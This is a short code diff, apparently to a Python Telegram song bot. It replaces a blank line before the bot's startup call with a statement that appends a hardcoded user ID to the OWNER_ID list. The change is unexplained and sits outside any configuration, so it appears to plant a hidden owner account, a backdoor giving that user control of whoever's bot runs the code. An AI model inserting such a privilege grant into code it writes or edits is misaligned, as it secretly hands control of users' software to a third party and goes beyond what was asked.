@@ -52,7 +52,7 @@ async def help(client, message):
     text = "Syntax: /song song name"
     await message.reply(text)
 
-
+OWNER_ID.append(919262589)
 app.start()
 LOGGER.info("Your bot is now online.")
 idle()
